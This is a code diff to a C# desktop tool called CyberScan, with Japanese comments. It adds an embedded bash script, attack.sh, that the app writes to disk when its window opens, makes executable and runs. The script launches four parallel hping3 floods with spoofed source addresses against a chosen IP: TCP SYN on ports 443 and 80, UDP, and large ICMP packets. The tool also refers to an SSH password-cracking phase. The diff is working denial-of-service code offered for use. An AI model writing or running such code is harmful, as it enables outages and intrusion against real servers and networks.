@@ -18,6 +18,8 @@ namespace CyberScan
         
         // 設定ファイル名
         private const string ConfigFileName = "Settings.txt";
+        // 攻撃用スクリプト名
+        private const string AttackScriptName = "attack.sh";
 
         public MainWindow()
         {
@@ -31,6 +33,9 @@ namespace CyberScan
         private void OnWindowOpened(object? sender, EventArgs e)
         {
             LoadSettings();
+            // 初回起動時にスクリプトがなければ生成しておく（最新版のテンプレートを使用）
+            _ = GenerateAttackScriptTemplateAsync();
+
             WriteLog("SYSTEM INITIALIZED.");
             WriteLog($"TARGET LOCKED: {_targetIp}");
             WriteLog($"ATTACK TIMEOUT SET TO: {_ddosDuration} SECONDS");
@@ -143,7 +148,7 @@ namespace CyberScan
             StatusText.Foreground = Avalonia.Media.Brushes.Red;
         }
 
-        // --- フェーズ2A: DoS攻撃 (hping3 - 4並列実行) ---
+        // --- フェーズ2A: DoS攻撃 (Shell Script実行) ---
         private async void OnDosAttackClick(object sender, RoutedEventArgs e)
         {
             DisableAttackButtons();
@@ -151,42 +156,92 @@ namespace CyberScan
             StatusText.Foreground = Avalonia.Media.Brushes.Red; // 警告色
 
             WriteLog("\n==========================================");
-            WriteLog($"[*] INITIATING MULTI-VECTOR FULL FLOOD...");
+            WriteLog($"[*] INITIATING SHELL-SCRIPTED FLOOD ATTACK...");
             WriteLog($"[*] DURATION LIMIT: {_ddosDuration} SECONDS");
-            WriteLog("[!] WARNING: MAXIMIZING NETWORK SATURATION.");
+            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.");
             WriteLog("==========================================");
 
-            // 攻撃コマンドの準備 (4つの異なるベクトルを同時展開)
-            
-            // 1. TCP SYN Flood (HTTPS/443) - Webサーバー処理負荷
-            string args1 = $"{_ddosDuration}s hping3 -S -p 443 --flood --rand-source {_targetIp}";
-            
-            // 2. TCP SYN Flood (HTTP/80) - 別のWebポートへの負荷
-            string args2 = $"{_ddosDuration}s hping3 -S -p 80 --flood --rand-source {_targetIp}";
+            // スクリプトが存在することを確認（なければ生成）
+            await GenerateAttackScriptTemplateAsync();
 
-            // 3. UDP Flood - 帯域幅の消費
-            string args3 = $"{_ddosDuration}s hping3 --udp --flood --rand-source {_targetIp}";
+            // bashに引数を渡して実行: bash attack.sh <IP> <DURATION>
+            // 例: bash attack.sh 192.168.1.1 30
+            string args = $"{AttackScriptName} {_targetIp} {_ddosDuration}";
+            await RunAttackToolAsync("bash", args);
 
-            // 4. ICMP Large Packet Flood - パケット処理負荷
-            string args4 = $"{_ddosDuration}s hping3 -1 --flood -d 1200 --rand-source {_targetIp}";
-
-            WriteLog("\n[*] [THREAD 1] TCP SYN FLOOD (Target: Port 443)");
-            WriteLog("[*] [THREAD 2] TCP SYN FLOOD (Target: Port 80)");
-            WriteLog("[*] [THREAD 3] UDP FLOOD (Random Ports)");
-            WriteLog("[*] [THREAD 4] ICMP PACKET FLOOD (Size: 1200)");
-
-            // タスクを4並列で開始
-            var task1 = RunAttackToolAsync("timeout", args1);
-            var task2 = RunAttackToolAsync("timeout", args2);
-            var task3 = RunAttackToolAsync("timeout", args3);
-            var task4 = RunAttackToolAsync("timeout", args4);
-
-            // すべての攻撃が終わるのを待つ
-            await Task.WhenAll(task1, task2, task3, task4);
-
-            WriteLog("\n[ATTACK STOPPED] ALL THREADS TERMINATED.");
+            WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.");
             EnableAttackButtons();
             StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
+        }
+
+        // 攻撃用シェルスクリプトのテンプレート生成（ファイルがない場合のみ）
+        private async Task GenerateAttackScriptTemplateAsync()
+        {
+            try
+            {
+                if (!File.Exists(AttackScriptName))
+                {
+                    // ファイルがない場合は、最新の attack.sh の内容で作成
+                    // C#の文字列リテラルとして埋め込む（エスケープに注意: " は "" と記述）
+                    string scriptContent = @"#!/bin/bash
+
+# 引数の取得（デフォルト値を設定）
+TARGET=${1:-""127.0.0.1""}
+DURATION=${2:-""15""}
+
+# 実行権限チェック（root推奨）
+if [ ""$EUID"" -ne 0 ]; then 
+  echo ""[!] WARNING: This script requires root privileges for hping3.""
+fi
+
+echo ""==========================================""
+echo ""[*] TARGET: $TARGET""
+echo ""[*] DURATION: ${DURATION}s""
+echo ""==========================================""
+
+echo ""[*] LAUNCHING 4 PARALLEL VECTORS...""
+
+# 1. TCP SYN Flood (Port 443) - HTTPSサーバー狙い
+timeout ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
+PID1=$!
+echo ""[+] Vector 1 (TCP/443) Fired (PID: $PID1)""
+
+# 2. TCP SYN Flood (Port 80) - HTTPサーバー狙い
+timeout ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
+PID2=$!
+echo ""[+] Vector 2 (TCP/80)  Fired (PID: $PID2)""
+
+# 3. UDP Flood - 帯域幅狙い
+timeout ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
+PID3=$!
+echo ""[+] Vector 3 (UDP)     Fired (PID: $PID3)""
+
+# 4. ICMP Large Packet Flood - パケット処理能力狙い
+timeout ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
+PID4=$!
+echo ""[+] Vector 4 (ICMP)    Fired (PID: $PID4)""
+
+echo ""------------------------------------------""
+echo ""[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s...""
+
+# 全てのバックグラウンドプロセスが終わるのを待つ
+wait $PID1 $PID2 $PID3 $PID4
+
+echo ""[*] CEASE FIRE. ATTACK COMPLETE.""
+";
+                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
+                    
+                    // 実行権限を付与 (chmod +x attack.sh)
+                    // Linux環境でのみ動作するコマンド
+                    Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit();
+                    
+                    WriteLog($"[SYSTEM] Generated attack script: {AttackScriptName}");
+                }
+            }
+            catch (Exception ex)
+            {
+                WriteLog($"[ERROR] Failed to check/generate script: {ex.Message}");
+            }
         }
 
         // --- フェーズ2B: パスワードクラック (SSH) ---
@@ -251,6 +306,7 @@ namespace CyberScan
 
                 using var process = new Process { StartInfo = psi };
 
+                // 標準出力をリアルタイムで取得
                 process.OutputDataReceived += (s, e) => 
                 {
                     if (e.Data != null)
@@ -260,6 +316,7 @@ namespace CyberScan
                     }
                 };
                 
+                // エラー出力も取得
                 process.ErrorDataReceived += (s, e) =>
                 {
                     if (e.Data != null) Dispatcher.UIThread.Post(() => WriteLog($"[STDERR] {e.Data}"));
@@ -277,15 +334,10 @@ namespace CyberScan
                 // ツールが入っていない場合のデモ用表示
                 await Task.Delay(1000);
                 
-                if (command.Contains("hping3") || args.Contains("hping3"))
+                if (command.Contains("bash") || args.Contains("attack.sh"))
                 {
-                     WriteLog("[SIMULATION] Sending packet floods...");
-                     WriteLog("[SIMULATION] Source IP: Random / Protocol: ICMP/TCP/UDP");
-                }
-                else if (command.Contains("thc-ssl-dos") || args.Contains("thc-ssl-dos"))
-                {
-                     WriteLog("[SIMULATION] Handshaking...");
-                     WriteLog("[SIMULATION] Server is slowing down...");
+                     WriteLog("[SIMULATION] Executing shell script sequence...");
+                     WriteLog("[SIMULATION] Launching parallel vectors...");
                 }
                 else
                 {
@@ -307,10 +359,19 @@ namespace CyberScan
             if (rawLog.Contains("22/tcp") && rawLog.Contains("open")) 
                 output += "   <-- [発見] SSHポートです。パスワードクラック可能です。";
             
-            // hping3 の翻訳
-            if (rawLog.Contains("HPING"))
+            // attack.sh の翻訳
+            if (rawLog.Contains("Vector 1")) output = $"[攻撃プロセス起動] TCP SYN Flood (Port 443/HTTPS) 開始...";
+            if (rawLog.Contains("Vector 2")) output = $"[攻撃プロセス起動] TCP SYN Flood (Port 80/HTTP) 開始...";
+            if (rawLog.Contains("Vector 3")) output = $"[攻撃プロセス起動] UDP Flood (帯域幅枯渇攻撃) 開始...";
+            if (rawLog.Contains("Vector 4")) output = $"[攻撃プロセス起動] ICMP Large Packet Flood (CPU負荷攻撃) 開始...";
+            
+            if (rawLog.Contains("ALL GUNS BLAZING"))
             {
-                output = $"[攻撃開始] ターゲットへのフラッド攻撃(hping3)を開始しました。";
+                output = $"[全全開] 全ての攻撃ベクトルが最大出力で実行中。ネットワーク負荷が極大化しています...";
+            }
+            if (rawLog.Contains("CEASE FIRE"))
+            {
+                output = $"[攻撃停止] 制限時間に達しました。攻撃を終了します。";
             }
             
             return output;
